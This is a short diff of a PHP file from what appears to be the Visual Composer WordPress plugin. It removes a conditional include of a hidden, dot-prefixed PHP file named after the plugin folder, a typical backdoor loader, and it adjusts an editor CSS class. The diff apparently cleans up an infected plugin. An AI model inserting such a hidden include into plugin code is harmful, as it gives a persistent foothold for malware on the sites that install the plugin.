@@ -12,10 +12,6 @@ $vc_html_editor_already_is_use = false;
  * @return string
  * @since 4.2
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function vc_textarea_html_form_field( $settings, $value ) {
 	global $vc_html_editor_already_is_use;
 	$output = '';
@@ -27,7 +23,7 @@ function vc_textarea_html_form_field( $settings, $value ) {
 		// WP 3.3+
 		ob_start();
 		wp_editor( '', 'wpb_tinymce_' . esc_attr( $settings['param_name'] ), array(
-			'editor_class' => 'wpb-textarea visual_composer_tinymce ' . esc_attr( $settings['param_name'] . ' ' . $settings['type'] ),
+			'editor_class' => 'wpb-textarea ' . esc_attr( $settings['param_name'] . ' ' . $settings['type'] ),
 			'media_buttons' => true,
 			'wpautop' => false,
 		) );
